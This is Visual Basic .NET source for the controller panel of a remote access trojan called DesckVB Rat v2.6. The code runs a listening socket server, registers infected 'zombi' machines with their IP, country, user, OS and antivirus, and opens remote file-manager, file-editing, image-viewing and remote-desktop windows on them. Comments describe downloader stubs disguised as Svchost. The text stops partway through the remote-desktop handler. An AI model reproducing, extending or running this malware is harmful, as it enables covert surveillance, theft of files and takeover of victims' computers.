Imports System.IO
Imports System
Imports System.Net
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Diagnostics
Imports System.Drawing
Imports System.Threading
Imports System.Windows.Forms
Imports System.Windows.Forms.Form
Imports System.Windows.Forms.ListView
Imports Microsoft.VisualBasic.Devices
Imports System.Runtime.CompilerServices
Imports System.Collections
Imports System.ComponentModel
Imports System.Windows
Imports System.Drawing.Bitmap
Imports System.Drawing.Imaging
Imports System.Drawing.Image
Imports System.Drawing.Icon
Imports System.Drawing.Drawing2D 'imagem 2d
Imports System.Environment
Imports System.Net.Sockets
Imports System.Windows.Forms.ListBox
Imports System.Net.NetworkInformation
Imports System.Net.Sockets.TcpListener
Imports System.Windows.Forms.MessageBox
Imports System.Windows.Forms.MenuStrip
Imports System.Windows.Forms.Panel
Imports System.Windows.Forms.ProgressBar
Imports System.Windows.Forms.TextBox
Imports System.Net.Mail
Imports System.Windows.Forms.ContextMenuStrip
Imports System.Windows.Forms.NumericUpDownAcceleration
Imports System.Windows.Forms.NumericUpDownAccelerationCollection
Imports System.Net.Dns


'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'Coded Cliente By Carlos.DF                                               '
'Coded Cliente e Stub By njq8                                             '
'Coded Cliente e Stub By Volkano                                          ' 
'Coded Cliente e Stub By OsamaCoder                                       '
'Coded Cliente e Stub By Umbrella-Win7                                    '
'Coded Cliente Rodom Strigs By Fud Mario                                  '
'Coded Cliente e Stub e Rodom Strigs By Pjoao1578                         ' 
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'My music Resources = sonido de notificasao                               '
'Ultima conpilaçao em visual studio 2013 DesckVB Rat 12/06/2015           '
'Ultima conpilaçao em visual studio 2013 Stub Normal 12/06/2015           '
'Ultima conpilaçao em visual studio 2013 Stub Downloadfile 12/06/2015     '
'Net frameworck 4.5 DesckVB Rat -> recomended Net frameworck 4.5          '
'Net frameworck 4.5 Stub normal                                           '
'Net frameworck 2.0 Stub Downloadfile                                     '
'recomended em DesckVB Rat -> Make single instance application            '
'not recomended em Stub normal -> Make single instance application        '
'not recomended em stub Downloadfile -> Make single instance application  '
'My Resources Microsoft = Stub normal                                     '
'My Resources Svchost = stub Downloadfile                                 '   
'DesckVB Rat v2.6                                                         '
'Stub 123 KB normal v2.6 /stub Downloadfile / 34 KB  v2.6                 '
'res = resoucer Hacker                                                    '
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''' 
Public Class Form1
#Region "inports"
    Private lvwColumnSorter As ListViewColumnSorter 'organize list dos zombis
    Public WithEvents s As New SocketServer 'conect / disconect
    Public yy As String = "||" 'yy =  "||" = senha
    Public sock As Integer 'chamar sock pra abri formes
    Public pinger As Integer = 0 'contador
    Dim hiden As FileAttribute = FileAttribute.Hidden + FileAttribute.System + FileAttributes.ReadOnly + FileAttributes.Directory 'hide + system
    Dim normal As FileAttribute = FileAttribute.Normal 'normal
    Dim pc As String = Environment.MachineName 'nome do pc     
    Dim user As String = Environment.UserName 'nome do user do pc
    Public exe As Object = Application.ExecutablePath 'executavel
    Public ii As Integer = 0 'contador
#End Region

    Private Sub RestartDesckVBRatToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartDesckVBRatToolStripMenuItem.Click
        'restart rat
        Try
            Me.ShowIcon = False 'icone minimized hide
            Me.DesckVB.Visible = False 'icone rat hide
            Me.Minimized.Visible = False 'icone minimized hide
            Me.ListBox1.Items.Clear() 'linpar logs
        Catch ex As Exception
        End Try
        Try
            Report.Close() 'close notificasao
            Report.Timer1.Stop() 'close notificasao
        Catch ex As Exception 'erro nao report
            ProjectData.SetProjectError(ex)
            Report.Close() 'close notificasao
            Report.Timer1.Stop() 'close notificasao
            ProjectData.ClearProjectError()
        End Try
        Try
            Process.Start(exe) 'restart
            ProjectData.EndApp() 'finalizar tudo
        Catch ex As Exception 'erro nao report
            Me.ShowIcon = False 'icone minimized hide
            Me.DesckVB.Visible = False 'icone rat hide
            Me.Minimized.Visible = False 'icone minimized hide
            Me.ListBox1.Items.Clear() 'linpar logs
            Me.ShowIcon = False 'icone minimized hide
            Me.DesckVB.Visible = False 'icone rat hide
            Me.Minimized.Visible = False 'icone minimized hide
            Me.ListBox1.Items.Clear() 'linpar logs
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub ExitDesckVBRatToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExitDesckVBRatToolStripMenuItem.Click
        'exit rat
        Try
            Me.ShowIcon = False 'icone minimized hide
            Me.DesckVB.Visible = False 'icone rat hide
            Me.Minimized.Visible = False 'icone minimized hide
            Me.ListBox1.Items.Clear() 'linpar logs
        Catch ex As Exception
        End Try
        Try
            Report.Close() 'close notificasao
            Report.Timer1.Stop() 'close notificasao
        Catch ex As Exception 'erro nao report
            ProjectData.SetProjectError(ex)
            Report.Close() 'close notificasao
            Report.Timer1.Stop() 'close notificasao
            ProjectData.ClearProjectError()
        End Try
        Try
            ProjectData.EndApp() 'finalizar tudo
        Catch ex As Exception 'erro nao report
            Me.ShowIcon = False 'icone minimized hide
            Me.DesckVB.Visible = False 'icone rat hide
            Me.Minimized.Visible = False 'icone minimized hide
            Me.ListBox1.Items.Clear() 'linpar logs
            ProjectData.SetProjectError(ex)
            Me.ShowIcon = False 'icone minimized hide
            Me.DesckVB.Visible = False 'icone rat hide
            Me.Minimized.Visible = False 'icone minimized hide
            Me.ListBox1.Items.Clear() 'linpar logs
            ProjectData.EndApp()
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub ShowDesckVBRatToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowDesckVBRatToolStripMenuItem.Click
        'show rat
        Me.ShowIcon = True
        Me.ShowInTaskbar = True
        Me.Minimized.Visible = False
        Me.DesckVB.Visible = True
        Me.Show() 'show rat 
    End Sub

    Private Sub ExitRatToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExitRatToolStripMenuItem.Click
        Try
            Me.ShowIcon = False 'icone minimized hide
            Me.DesckVB.Visible = False 'icone rat hide
            Me.Minimized.Visible = False 'icone minimized hide
            Me.ListBox1.Items.Clear() 'linpar logs
        Catch ex As Exception
        End Try
        Try
            Report.Close() 'close notificasao
            Report.Timer1.Stop() 'close notificasao
        Catch ex As Exception 'erro nao report
            ProjectData.SetProjectError(ex)
            Report.Close() 'close notificasao
            Report.Timer1.Stop() 'close notificasao
            ProjectData.ClearProjectError()
        End Try
        Try
            ProjectData.EndApp() 'finalizar tudo
        Catch ex As Exception 'erro nao report
            Me.ShowIcon = False 'icone minimized hide
            Me.DesckVB.Visible = False 'icone rat hide
            Me.Minimized.Visible = False 'icone minimized hide
            Me.ListBox1.Items.Clear() 'linpar logs
            ProjectData.SetProjectError(ex)
            Me.ShowIcon = False 'icone minimized hide
            Me.DesckVB.Visible = False 'icone rat hide
            Me.Minimized.Visible = False 'icone minimized hide
            Me.ListBox1.Items.Clear() 'linpar logs
            ProjectData.EndApp()
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Form1_FormClosed(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosedEventArgs) Handles Me.FormClosed
        Try
            Me.ShowIcon = False 'icone minimized hide
            Me.DesckVB.Visible = False 'icone rat hide
            Me.Minimized.Visible = False 'icone minimized hide
            Me.ListBox1.Items.Clear() 'linpar logs
        Catch ex As Exception
        End Try
        Try
            Report.Close() 'close notificasao
            Report.Timer1.Stop() 'close notificasao
        Catch ex As Exception 'erro nao report
            ProjectData.SetProjectError(ex)
            Report.Close() 'close notificasao
            Report.Timer1.Stop() 'close notificasao
            ProjectData.ClearProjectError()
        End Try
        Try
            l1.Items.Clear() 'linpar
            File.SetAttributes(exe & "/Configs/config5.txt", hiden)
            ProjectData.EndApp() 'finalizar tudo
        Catch ex As Exception 'erro nao report
            Me.ShowIcon = False 'icone minimized hide
            Me.DesckVB.Visible = False 'icone rat hide
            Me.Minimized.Visible = False 'icone minimized hide
            Me.ListBox1.Items.Clear() 'linpar logs
            ProjectData.SetProjectError(ex)
            Me.ShowIcon = False 'icone minimized hide
            Me.DesckVB.Visible = False 'icone rat hide
            Me.Minimized.Visible = False 'icone minimized hide
            Me.ListBox1.Items.Clear() 'linpar logs
            ProjectData.EndApp()
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Try
            Me.ShowIcon = False 'icone minimized hide
            Me.DesckVB.Visible = False 'icone rat hide
            Me.Minimized.Visible = False 'icone minimized hide
            Me.ListBox1.Items.Clear() 'linpar logs
        Catch ex As Exception 'erro nao report
        End Try
        Try
            Report.Close() 'close notificasao
            Report.Timer1.Stop() 'close notificasao
        Catch ex As Exception 'erro nao report
            ProjectData.SetProjectError(ex)
            Report.Close() 'close notificasao
            Report.Timer1.Stop() 'close notificasao
            ProjectData.ClearProjectError()
        End Try
        Try
            l1.Items.Clear() 'linpar
            File.SetAttributes(exe & "/Configs/config5.txt", hiden)
            ProjectData.EndApp() 'finalizar tudo
        Catch ex As Exception 'erro nao report
            Me.ShowIcon = False 'icone minimized hide
            Me.DesckVB.Visible = False 'icone rat hide
            Me.Minimized.Visible = False 'icone minimized hide
            Me.ListBox1.Items.Clear() 'linpar logs
            ProjectData.SetProjectError(ex)
            Me.ShowIcon = False 'icone minimized hide
            Me.DesckVB.Visible = False 'icone rat hide
            Me.Minimized.Visible = False 'icone minimized hide
            Me.ListBox1.Items.Clear() 'linpar logs
            ProjectData.EndApp()
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Form1_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        'Minimize forme1 = rat Minimized
        If opções.CheckBox7.Checked = True Then
            If WindowState = FormWindowState.Minimized Then
                Me.ShowIcon = False
                Me.ShowInTaskbar = False
                Me.Minimized.Visible = True
                Me.DesckVB.Visible = False
                'infor balao
                Me.Minimized.BalloonTipTitle = "Bem Vindo " & Environment.UserName 'titulo e name do user
                Me.Minimized.BalloonTipIcon = ToolTipIcon.Info 'balao icone infor
                Me.Minimized.BalloonTipText = "DesckVB Rat Foi Minimizado" 'texto
                Me.Minimized.ShowBalloonTip(7000) 'sleep 7000 = 7 segundos de durasao
                Me.Hide() 'hide
            End If
        End If
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try
            Me.PictureBox6.Visible = False 'previa capture descktop
            Me.PictureBox6.Enabled = False 'previa capture descktop
            System.Windows.Forms.Control.CheckForIllegalCrossThreadCalls = False 'not remover
            Me.PictureBox2.BackColor = Color.Black '= Color breta
            Me.Timer2.Start() 'start nome do trojan e versao e users onlines
            ''verificar se a pasta Download existe caso nao exista criala  para poder fazer Download no file maneger
            If My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "/Download") And My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "/Voice") Then
                '1 verificar se a pasta Download existe caso nao exista criala
            Else
                '2 criar a pasta Download caso nao exista
                My.Computer.FileSystem.CreateDirectory(Application.StartupPath & "/Download")
            End If
            'verificar se a pasta configs existe caso nao exista criala
            If My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "/Configs") And My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "/Voice") Then
                '1 verificar se a pasta configs existe caso nao exista criala
            Else
                '2 criar a pasta configs caso nao exista
                My.Computer.FileSystem.CreateDirectory(Application.StartupPath & "/Configs")
            End If
            'verificar se confis.txt e confis1.txt e confis2.txt e confis3.txt existem caso nao exista criar os configs
            If IO.File.Exists(Application.StartupPath & "/Configs/config.txt") Then 'criar os config
                '1 criar os config.txt caso nao exista
            Else
                '2 se existe escrever em texto true 
                Dim texto As String = "true"
                Dim esc_texto As New StreamWriter(Application.StartupPath & "/Configs/config.txt")
                esc_texto.Write(texto)
                esc_texto.Close()
            End If
            If IO.File.Exists(Application.StartupPath & "/Configs/config1.txt") Then 'criar os config
                '1 criar os config1.txt caso nao exista
            Else
                '2 se existe escrever em texto true 
                Dim texto As String = "false"
                Dim esc_texto As New StreamWriter(Application.StartupPath & "/Configs/config1.txt")
                esc_texto.Write(texto)
                esc_texto.Close()
            End If
            If IO.File.Exists(Application.StartupPath & "/Configs/config2.txt") Then 'criar os config
                '1 criar os config2.txt caso nao exista
            Else
                '2 se existe escrever em texto true
                Dim texto As String = "true"
                Dim esc_texto As New StreamWriter(Application.StartupPath & "/Configs/config2.txt")
                esc_texto.Write(texto)
                esc_texto.Close()
            End If
            If IO.File.Exists(Application.StartupPath & "/Configs/config3.txt") Then 'criar os config
                '1 criar os config3.txt caso nao exista
            Else
                '2 se existe escrever em texto true 
                Dim texto As String = NumericUpDown1.Value
                Dim esc_texto As New StreamWriter(Application.StartupPath & "/Configs/config3.txt")
                esc_texto.Write(texto)
                esc_texto.Close()
            End If
            If IO.File.Exists(Application.StartupPath & "/Configs/config4.txt") Then 'criar os config
                '1 criar os config4.txt caso nao exista
            Else
                '2 se existe escrever em texto true 
                Dim texto As String = "True"
                Dim esc_texto As New StreamWriter(Application.StartupPath & "/Configs/config4.txt")
                esc_texto.Write(texto)
                esc_texto.Close()
            End If
            Try
                File.SetAttributes(Application.StartupPath & "/Configs/config5.txt", normal) 'normal
            Catch ex As Exception
            End Try
            If IO.File.Exists(Application.StartupPath & "/Configs/config5.txt") Then 'criar os config
                '1 criar os config5.txt caso nao exista
            Else
                '2 se existe escrever em texto true 
                Dim texto As String = "true"
                Dim esc_texto As New StreamWriter(Application.StartupPath & "/Configs/config5.txt")
                esc_texto.Write(texto)
                esc_texto.Close()
            End If
            If IO.File.Exists(Application.StartupPath & "/Configs/config6.txt") Then 'criar os config
                '1 criar os config5.txt caso nao exista
            Else
                '2 se existe escrever em texto true 
                Dim texto As String = "false"
                Dim esc_texto As New StreamWriter(Application.StartupPath & "/Configs/config6.txt")
                esc_texto.Write(texto)
                esc_texto.Close()
            End If
            If IO.File.Exists(Application.StartupPath & "/Configs/config7.txt") Then 'criar os config
                '1 criar os config5.txt caso nao exista
            Else
                '2 se existe escrever em texto true 
                Dim texto As String = "false"
                Dim esc_texto As New StreamWriter(Application.StartupPath & "/Configs/config7.txt")
                esc_texto.Write(texto)
                esc_texto.Close()
            End If
            If IO.File.Exists(Application.StartupPath & "/Configs/config8.txt") Then 'criar os config
                '1 criar os config5.txt caso nao exista
            Else
                '2 se existe escrever em texto true 
                Dim texto As String = "true"
                Dim esc_texto As New StreamWriter(Application.StartupPath & "/Configs/config8.txt")
                esc_texto.Write(texto)
                esc_texto.Close()
            End If
            If IO.File.Exists(Application.StartupPath & "/Configs/config9.txt") Then 'criar os config
                '1 criar os config5.txt caso nao exista
            Else
                '2 se existe escrever em texto true 
                Dim texto As String = 100
                Dim esc_texto As New StreamWriter(Application.StartupPath & "/Configs/config9.txt")
                esc_texto.Write(texto)
                esc_texto.Close()
            End If
            If IO.File.Exists(Application.StartupPath & "/Configs/config10.txt") Then 'criar os config
                '1 criar os config5.txt caso nao exista
            Else
                '2 se existe escrever em texto true 
                Dim texto As String = 1
                Dim esc_texto As New StreamWriter(Application.StartupPath & "/Configs/config10.txt")
                esc_texto.Write(texto)
                esc_texto.Close()
            End If
            'caregar config para da true ou false nas configuraçoes
            If IO.File.Exists(Application.StartupPath & "/Configs/config.txt") Then
                opções.CheckBox1.Checked = IO.File.ReadAllText(Application.StartupPath & "/Configs/config.txt")
            End If
            'caregar config para da true ou false nas configuraçoes 
            If IO.File.Exists(Application.StartupPath & "/Configs/config1.txt") Then
                opções.CheckBox2.Checked = IO.File.ReadAllText(Application.StartupPath & "/Configs/config1.txt")
            End If
            'caregar config para da true ou false nas configuraçoes
            If IO.File.Exists(Application.StartupPath & "/Configs/config2.txt") Then
                opções.CheckBox3.Checked = IO.File.ReadAllText(Application.StartupPath & "/Configs/config2.txt")
            End If
            'salvar porta de conexoes
            If IO.File.Exists(Application.StartupPath & "/Configs/config3.txt") Then
                Me.NumericUpDown1.Value = IO.File.ReadAllText(Application.StartupPath & "/Configs/config3.txt")
            End If
            'caregar config para da true ou false nas configuraçoes 
            If IO.File.Exists(Application.StartupPath & "/Configs/config4.txt") Then
                opções.CheckBox4.Checked = IO.File.ReadAllText(Application.StartupPath & "/Configs/config4.txt")
            End If
            'caregar config para da true ou false nas configuraçoes 
            If IO.File.Exists(Application.StartupPath & "/Configs/config5.txt") Then 'criar os config
                '1 criar os config5.txt caso nao exista
                Info.CheckBox1.Checked = IO.File.ReadAllText(Application.StartupPath & "/Configs/config5.txt")
            End If
            'caregar config para da true ou false nas configuraçoes 
            If IO.File.Exists(Application.StartupPath & "/Configs/config6.txt") Then 'criar os config
                '1 criar os config5.txt caso nao exista
                opções.CheckBox6.Checked = IO.File.ReadAllText(Application.StartupPath & "/Configs/config6.txt")
            End If
            'caregar config para da true ou false nas configuraçoes
            If IO.File.Exists(Application.StartupPath & "/Configs/config7.txt") Then 'criar os config
                '1 criar os config5.txt caso nao exista
                opções.CheckBox7.Checked = IO.File.ReadAllText(Application.StartupPath & "/Configs/config7.txt")
            End If
            'caregar config para da true ou false nas configuraçoes 
            If IO.File.Exists(Application.StartupPath & "/Configs/config8.txt") Then 'criar os config
                '1 criar os config5.txt caso nao exista
                opções.CheckBox8.Checked = IO.File.ReadAllText(Application.StartupPath & "/Configs/config8.txt")
            End If
            'caregar config para da true ou false nas configuraçoes 
            If IO.File.Exists(Application.StartupPath & "/Configs/config9.txt") Then 'criar os config
                '1 criar os config5.txt caso nao exista
                opções.ComboBox2.Text = IO.File.ReadAllText(Application.StartupPath & "/Configs/config9.txt")
            End If
            'caregar config para da true ou false nas configuraçoes 
            If IO.File.Exists(Application.StartupPath & "/Configs/config10.txt") Then 'criar os config
                '1 criar os config5.txt caso nao exista
                opções.ComboBox1.Text = IO.File.ReadAllText(Application.StartupPath & "/Configs/config10.txt")
            End If
            'Pc/User e imagem true ou false = on ou off
            If opções.CheckBox4.Checked = True Then
                Me.Label1.Visible = True
                Me.PictureBox1.Visible = True
            Else
                Me.Label1.Visible = False
                Me.PictureBox1.Visible = False
            End If
            'bem vindo notificaçao
            Me.ShowInTaskbar = True
            Me.DesckVB.Visible = True
            Me.DesckVB.Icon = Me.Icon '= icone do rat
            Me.Minimized.Icon = Me.Icon '= icone rat Minimized
            Me.Show() 'show rat
            Me.DesckVB.BalloonTipTitle = "Bem Vindo " & Environment.UserName 'titulo e name do user
            Me.DesckVB.BalloonTipIcon = ToolTipIcon.Info 'balao icone infor
            Me.DesckVB.BalloonTipText = "DesckVB Rat Coded By Pjoao1578" & Environment.NewLine & "Skype = Pjoao1578" 'texto/Environment.NewLine = prosima linha text
            Me.DesckVB.ShowBalloonTip(7000) 'sleep 7000 = 7 segundos de durasao
            Me.Timer2.Start() 'exit Baloon depois de 7 segundos
            'label computer e user
            Me.Label1.Text = "PC/User " & pc & "/" & user & " " & bits() & " " & RAM()
            Me.Label2.Text = NumericUpDown1.Value & " Porta Off" : Me.PictureBox2.Image = Me.PictureBox4.Image 'porta off e imagem off
            Me.Button1.ForeColor = Color.Green 'txt color verde
            Me.Button1.Text = "Stop" 'butao1 = nome stop
            'alto Start porta
            If opções.CheckBox6.Checked = True Then
                Me.Button1.Text = "Stop" 'butao1 = nome stop
                s = New SocketServer 'conect
                s.Start(Me.NumericUpDown1.Value) 'start porta
                Me.Label2.Text = Me.NumericUpDown1.Value & " Porta ON" : Me.PictureBox2.Image = Me.PictureBox3.Image 'porta ON e imagem ON 
                Dim texto As String = Me.NumericUpDown1.Value
                Dim esc_texto As New StreamWriter(Application.StartupPath & "/Configs/config3.txt")
                esc_texto.Write(texto)
                esc_texto.Close()
                Me.Button1.ForeColor = Color.Red 'txt color vermelho
            End If
            IO.File.SetAttributes(Application.StartupPath & "/Configs/config5.txt", hiden)
        Catch ex As Exception 'erro nao report
            Me.ListBox1.Items.Add("Erro Em DesckVB Rat Ao Iniciar ! Porta: " & Me.NumericUpDown1.Value & " Day Date " & My.Computer.Clock.LocalTime) 'logs)
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Public Function bits() As String
        '32 e 64 bits computer detection em my pc
        Dim os As System.OperatingSystem = System.Environment.OSVersion
        Dim osName As String
        Dim k As String() = Split(Environment.OSVersion.ServicePack, " ")
        If k.Length = 1 Then
        End If
        osName &= k(k.Length - 1)
        If Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Hardware\Description\System\CentralProcessor\0").GetValue("Identifier").ToString.Contains("x86") Then
            osName += " 32Bits" 'my computer 32 Bits
        Else
            osName += " 64Bits" 'my computer 64 Bits
        End If
        Return osName
    End Function

    Function RAM() As String
        'computer capiture ram Mega e Giga em my pc
        Dim x As String = ""
        Dim PH As Long = Val(My.Computer.Info.TotalPhysicalMemory)
        If PH > 1073741824 Then
            x = (PH / 1073741824).ToString
            x = x.Remove(4, x.Length - 4) + " GB" 'Giga Byts
        ElseIf PH > 1048576 Then
            x = (PH / 1048576).ToString
            x = x.Remove(4, x.Length - 4) + " Me" 'Mega Byts
        End If
        Return x
    End Function

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick 'enterval a 350 = 350 sentesimos
        'nome do rat versao e users onlines e selecionados
        Me.Text = "[DesckVB Rat V2.6 Bleck Edition Private] Users Online [ x ]".Replace("x", Me.l1.Items.Count) & (" Users Selecionados [ " & Conversions.ToString(Me.l1.SelectedItems.Count) & " ]")
        Me.Label3.Text = "Onlines Conecteds = [x]".Replace("x", Me.l1.Items.Count)
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick 'enterval a 7003 = 7 segundos e 3 sentesimos
        Me.DesckVB.Visible = False 'hide
        Me.Timer1.Stop() 'stop
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        pinger = pinger + 1
    End Sub

#Region "conect"
    Private Sub connected(ByVal sock As Integer) Handles s.Connected
        Try 'conect
            s.Send(sock, "info") 'chamar info
            Me.ListBox1.Items.Add("Server Conected ! Ip:" & s.IP(sock) & " Day Date " & My.Computer.Clock.LocalTime) 'logs
        Catch ex As Exception 'erro nao report
            Me.ListBox1.Items.Add("Erro Em Connected Server ! Porta: " & Me.NumericUpDown1.Value & " Day Date " & My.Computer.Clock.LocalTime) 'logs)
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub disconnected(ByVal sock As Integer) Handles s.DisConnected
        Try 'disconect
            Me.l1.Items(sock.ToString).Remove() 'remove dosconectds
            Me.ListBox1.Items.Add("Server Diconected ! Ip:" & s.IP(sock) & " Day Date " & My.Computer.Clock.LocalTime) 'logs
        Catch ex As Exception 'erro nao report
            Me.ListBox1.Items.Add("Erro Em Disconnected Server ! Porta: " & Me.NumericUpDown1.Value & " Day Date " & My.Computer.Clock.LocalTime) 'logs)
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
        ii += 1 '+ 1 online disconecteds
        Me.Label4.Text = "Onlines Disconnecteds = " & "[" & ii & "]"
    End Sub
    Delegate Sub _data(ByVal sock As Integer, ByVal b As Byte())
    Sub data(ByVal sock As Integer, ByVal b As Byte()) Handles s.Data
        Dim a As String() = Split(BS(b), yy) 'yy = "||" = senha
        Dim aaa As String = "" 'bandeira do Report / notificaçao
        Try
            Select Case a(0)
                Case "info"
                    'notificação visual 
                    Dim n1 As Report = My.Application.OpenForms("new" & sock) 'notificação visual show
                    If n1 Is Nothing Then
                        If Me.InvokeRequired Then
                            Me.Invoke(New _data(AddressOf data), New Object() {sock, b})
                            Exit Sub
                        End If
                        'rat add
                        Dim rat = Me.l1.Items.Add(sock.ToString, a(1), GetCountryNumber(UCase(a(4)))) 'a(4) = nome de pais ex(Brasil) = Show imagem em a(1)
                        rat.SubItems.Add(s.IP(sock)) 'colum 1 ip / colum 0 bandeira e id namer
                        rat.SubItems.Add(a(2)) 'computer
                        rat.SubItems.Add(a(3)) 'user
                        rat.SubItems.Add(a(4)) 'pais
                        rat.SubItems.Add(a(5)) 'idioma
                        rat.SubItems.Add(a(6)) 'windows
                        rat.SubItems.Add(a(7)) 'antivirus
                        rat.SubItems.Add(a(8)) 'versao
                        rat.SubItems.Add(a(9)) 'ram do pc 
                        rat.SubItems.Add(a(10)) 'instal date
                        rat.ToolTipText = sock
                        'som da notificação
                        If opções.CheckBox3.Checked = True Then
                            Try
                                My.Computer.Audio.Play(My.Resources.Musica1, AudioPlayMode.WaitToComplete) 'tocar 1x por cada zombi conectado
                            Catch ex As Exception
                                Me.ListBox1.Items.Add("Erro Som De Notificação Sonora !") 'logs
                                ProjectData.SetProjectError(ex)
                                ProjectData.ClearProjectError()
                            End Try
                        End If
                        'notificação visual add e show
                        If opções.CheckBox1.Checked = True Then
                            Try
                                n1 = New Report
                                n1.Name = "new" & sock
                                kk.Items.Add(sock.ToString, aaa, GetCountryNumber(UCase(a(4)))) 'bandeira do Report
                                n1.kkk.Items.Add(sock.ToString, aaa, GetCountryNumber(UCase(a(4)))) 'bandeira do Report
                                n1.Label1.Text = s.IP(sock) 'ip
                                n1.Label2.Text = a(1) 'id
                                n1.Label3.Text = a(3) 'user
                                n1.Label4.Text = a(4) 'pais
                                n1.Label5.Text = a(6) 'windows
                                n1.Label8.Text = a(7) 'antivirus
                                n1.Label7.Text = a(8) 'versao
                                n1.Label10.Text = a(9) 'ram do pc
                                n1.Label13.Text = a(5) 'Idioma
                                n1.Label19.Text = a(2) 'computer
                                n1.Show()
                            Catch ex As Exception
                                Me.ListBox1.Items.Add("Erro Som De Notificação Visual !") 'logs
                                ProjectData.SetProjectError(ex)
                                ProjectData.ClearProjectError()
                            End Try
                        End If
                    End If
                Case "sendinformation"
                    If My.Application.OpenForms("Information" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim info As New Informaçoes
                    info.sock = sock
                    info.Name = "Information" & sock
                    info.Text = "Information " & Me.l1.Items.Item(0).SubItems.Item(2).Text & "/" & Me.l1.Items.Item(0).SubItems.Item(3).Text & " " & s.IP(sock) 'nome + user/computer + ip
                    info.TextBox1.Text = "Computer/ " & a(1) & vbNewLine & "User/ " & a(2) & vbNewLine & "Windows/ " & a(3) & vbNewLine & "Vercion/ " & a(4) & vbNewLine &
                    "Idioma/ " & a(5) & vbNewLine & "Porta/ " & a(6) & vbNewLine & "Host/ " & a(7) & vbNewLine & "Local Do server/ " & a(8) & vbNewLine & "Processador/ " & a(9) &
                    vbNewLine & "Processador/ " & a(10) & vbNewLine & "Name Da Placa Mãe/ " & a(11) & vbNewLine & "Placa Activer/ " & a(12) & vbNewLine & "Marca Da Placa Mãe/ " & a(13) &
                    vbNewLine & "Name Do Server/ " & a(14) & vbNewLine & "Pais do Computer/ " & a(15) & vbNewLine & "Antivirus Ou Anti Malwares/ " & a(16) & vbNewLine & "Ram Do Computer/ " & a(17) &
                    vbNewLine & "Bits 32 64/ " & a(18) & vbNewLine & "Instal Date Server/ " & a(19) & vbNewLine & "Date Atual De Hoje " & a(20) &
                    vbNewLine & "IP Lan/ " & a(21) & "IP Wan/ " & s.IP(sock) & vbNewLine & "Name Do Server/ " & a(22) & vbNewLine & "Local Do server/ " & a(23)
                    info.Show()
                    'txt editor file manager
                Case "edittextfile"
                    If My.Application.OpenForms("TXT Editor" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim texter As New TXT_Editor
                    texter.sock = sock
                    texter.Name = "TXT Editor" & sock
                    texter.Text = "TXT Editor " & Me.l1.Items.Item(0).SubItems.Item(2).Text & "/" & Me.l1.Items.Item(0).SubItems.Item(3).Text & " " & s.IP(sock) 'nome + user/computer + ip
                    texter.pathoftext = a(1)
                    texter.TextBox1.Text = a(2)
                    texter.Show() 'abri forme
                    'file manager open local temp,descktop,starttup,documento,appdata,music.pictures,downloads,videos,system32,programasfile,userprofile
                Case "getpath"
                    Dim fff As Fm = My.Application.OpenForms("openfm" & sock)
                    fff.TextBox1.Text = a(1)
                    s.Send(sock, "FileManager" & yy & a(1))
                    'txt show file manager
                Case "Text"
                    Dim fff As Fm = My.Application.OpenForms("openfm" & sock)
                    If a(1) = "Erro !!" Then
                        fff.DaloadToolStripMenuItem.PerformClick()
                    Else
                        fff.TextBox2.Text = a(1)
                    End If
                    'imagem show file manager
                Case "viewimage"
                    Dim fff As Fm = My.Application.OpenForms("openfm" & sock)
                    If a(1) = "Erro !!" Then
                        fff.DaloadToolStripMenuItem.PerformClick()
                    Else
                        Dim picbyte() As Byte = Convert.FromBase64String(a(1))
                        Dim ms As New MemoryStream(picbyte)
                        fff.PictureBox1.Image = Image.FromStream(ms)
                    End If
                    'remote descktop
                Case "!" 'i recive size of client screen
                    If My.Application.OpenForms("!" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim cap As New Descktop
                    cap.F = Me
                    cap.Sock = Me.sock
                    cap.Text = "Remote Descktop " & Me.l1.Items.Item(0).SubItems.Item(2).Text & "/" & Me.l1.Items.Item(0).SubItems.Item(3).Text & " " & s.IP(sock) 'nome + user/computer + ip
                    cap.Name = "!" & sock
                    cap.Sz = New Size(a(1), a(2))
                    cap.Show()
                Case "@" 'i recive image / remote descktop
